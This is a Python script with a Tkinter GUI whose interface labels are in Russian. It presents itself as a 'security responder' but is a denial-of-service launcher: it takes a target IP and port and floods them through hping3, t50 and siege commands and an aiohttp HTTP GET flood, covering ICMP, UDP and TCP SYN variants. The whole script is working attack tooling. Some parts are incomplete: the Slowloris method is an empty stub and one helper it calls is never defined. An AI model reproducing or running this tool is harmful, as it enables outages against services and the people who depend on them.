# It is prototype and it is not proper tested yet, and probably not safe. Use on your own risk.
## It is the same code, but providing a gui interface.
    #!/usr/bin/python3
    import os
    import subprocess
    import socket
    import random
    import asyncio
    import aiohttp
    import time
    import logging
    import tkinter as tk
    from tkinter import font, messagebox
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from colorama import Fore, Style, init
    
    init(autoreset=True)
    logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    os.system("clear")
    os.system("figlet KALINUX SECURITY RESPONDER")
    
    class AttackManager:
        def __init__(self, target_ip, target_port=80, num_requests=1000, max_threads=4, attack_duration=30):
            self.target_ip = target_ip
            self.target_port = target_port
            self.num_requests = num_requests
            self.max_threads = max_threads
            self.attack_duration = attack_duration
            self.protocol_methods = {
                "UDP": self.udp_flood,
                "TCP": self.tcp_syn_flood,
                "HTTP": self.run_http_attack,
                "T50": self.t50_attack,
                "Siege": self.siege_attack,
                "Hping3": self.hping3_attack,
                "Slowloris": self.slowloris_attack,
                "ICMP": self.icmp_flood
            }
    
        def icmp_flood(self):
            command = f"sudo hping3 {self.target_ip} --icmp --flood"
            self.run_command(command, "ICMP Flood")
    
        def udp_flood(self):
            command = f"sudo hping3 {self.target_ip} --udp --flood -p {self.target_port}"
            self.run_command(command, "UDP Flood")
    
        def tcp_syn_flood(self):
            command = f"sudo hping3 {self.target_ip} -S -p {self.target_port} --flood"
            self.run_command(command, "TCP SYN Flood")
    
        async def http_flood(self, session, url):
            headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
            try:
                async with session.get(url, headers=headers) as response:
                    logging.info(f"Sent GET request to {url}, Status: {response.status}")
            except Exception as e:
                logging.error(f"Error in HTTP request: {e}")
    
        async def run_http_attack(self):
            url = f"http://{self.target_ip}:{self.target_port}/{self.generate_random_path()}"
            async with aiohttp.ClientSession() as session:
                tasks = [self.http_flood(session, url) for _ in range(self.num_requests)]
                await asyncio.gather(*tasks)
    
        def slowloris_attack(self):
            # Реализация атаки Slowloris
            pass
    
        def hping3_attack(self):
            commands = [
               f"sudo hping3 -A {self.target_ip} -p {self.target_port} --flood",
               f"sudo hping3 -S {self.target_ip} -p {self.target_port} --flood -d 1000",
               f"sudo hping3 -2 {self.target_ip} -p {self.target_port} -s 1024-65535 --flood",
               f"sudo hping3 -2 {self.target_ip} -p {self.target_port} --flood --interval u1000"
               ]
            for command in commands:
               self.run_command(command, "Hping3 attack")
    
        def t50_attack(self):
            commands = [
                f"sudo t50 {self.target_ip} --protocol TCP --flood --dport {self.target_port}",
                f"sudo t50 {self.target_ip} --protocol ICMP --flood",
                f"sudo t50 {self.target_ip} --protocol UDP --flood --dport {self.target_port}"
                ]
            for command in commands:
                self.run_command(command, "T50 attack")
    
        def siege_attack(self):
            commands = [
                f"siege -t 1m http://{self.target_ip}",
                f"siege -c 100 -t 1m http://{self.target_ip}"
                ]
            for command in commands:
                self.run_command(command, "Siege attack")
    
        def run_command(self, command, description):
            try:
               subprocess.run(command, shell=True, timeout=self.attack_duration)
               logging.info(f"{description} completed.")
            except subprocess.TimeoutExpired:
               logging.warning(f"{description} timed out.")
            except Exception as e:
               logging.error(f"Error during {description}: {e}")
    
        def execute_attack(self, protocol):
            if protocol == "HTTP":
                asyncio.run(self.run_http_attack())
            elif protocol in self.protocol_methods:
                self.protocol_methods[protocol]()
            else:
                logging.error(f"Invalid protocol: {protocol}")
    
    class AttackApp:
        def __init__(self, root):
            self.root = root
            self.root.title("KALINUX SECURITY RESPONDER")
            self.root.geometry("800x600")
    
            # Настройка шрифтов
            self.default_font = font.Font(family="Helvetica", size=12)
            self.label_font = font.Font(family="Helvetica", size=14, weight="bold")
    
            # GUI компоненты
            self.title_label = tk.Label(root, text="KALINUX SECURITY RESPONDER", font=("Helvetica", 18, "bold"))
            self.title_label.pack(pady=20)
            
            self.ip_label = tk.Label(root, text="Введите IP-адрес цели:", font=self.label_font)
            self.ip_label.pack(pady=10)
            self.ip_entry = tk.Entry(root, font=self.default_font)
            self.ip_entry.pack(pady=5)
    
            self.port_label = tk.Label(root, text="Введите порт (по умолчанию 80):", font=self.label_font)
            self.port_label.pack(pady=10)
            self.port_entry = tk.Entry(root, font=self.default_font)
            self.port_entry.pack(pady=5)
    
            self.protocol_label = tk.Label(root, text="Выберите протокол атаки (например, UDP, TCP, HTTP):", font=self.label_font)
            self.protocol_label.pack(pady=10)
            self.protocol_entry = tk.Entry(root, font=self.default_font)
            self.protocol_entry.pack(pady=5)
    
            self.start_button = tk.Button(root, text="Начать атаку", font=self.default_font, command=self.start_attack)
            self.start_button.pack(pady=20)
            
            self.status_label = tk.Label(root, text="", font=self.default_font)
            self.status_label.pack(pady=10)
    
        def start_attack(self):
            target_ip = self.ip_entry.get()
            target_port = self.port_entry.get() or "80"  # Используем порт 80 по умолчанию
            protocol = self.protocol_entry.get()
    
            if not target_ip:
                messagebox.showerror("Ошибка", "Введите IP-адрес цели")
                return
            if not target_port.isdigit():
                messagebox.showerror("Ошибка", "Порт должен быть числом")
                return
            if not protocol:
                messagebox.showerror("Ошибка", "Выберите протокол атаки")
                return
    
            manager = AttackManager(target_ip, int(target_port))
            self.status_label.config(text=f"Запуск атаки {protocol} на {target_ip}:{target_port}...")
            manager.execute_attack(protocol)
            self.status_label.config(text=f"Атака {protocol} завершена")
    

    root = tk.Tk()
    app = AttackApp(root)
    root.mainloop()
